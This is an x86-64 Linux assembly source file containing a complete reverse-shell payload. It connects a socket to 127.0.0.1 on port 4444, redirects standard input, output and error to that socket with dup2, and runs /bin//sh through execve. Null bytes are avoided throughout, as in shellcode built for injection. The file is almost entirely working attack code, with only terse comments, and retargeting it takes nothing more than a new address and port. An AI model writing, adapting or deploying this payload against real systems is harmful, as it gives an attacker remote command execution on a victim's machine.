global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 


	xor eax, eax
	mov al, 41
	xor edi, edi
	mov dil, 2
	xor esi, esi
	mov sil, 1
	xor edx, edx
	syscall

	; copy socket descriptor to rdi for future use 

	mov edi, eax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor eax, eax 

	push rax
	mov al, 0x2
	push rax
	
	mov byte [rsp+4], 0x7f
	mov byte [rsp+7], 0x01
	mov word [rsp+2], 0x5c11
	;mov dword [rsp-4], 0x0100007f
	;mov word [rsp-6], 0x5c11
	;mov word [rsp-8], 0x2
	;sub rsp, 8


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	xor eax, eax
	mov al, 42
	mov rsi, rsp
	xor edx, edx
	mov dl, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        
	xor eax, eax
	mov al, 33
	xor esi, esi
        syscall

	xor eax, eax
	mov al, 33
	xor esi, esi
        mov sil, 1
        syscall

	xor eax, eax
	mov al, 33
	xor esi, esi
        mov sil, 2
        syscall



        ; execve

        ; First NULL push

        xor eax, eax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
 
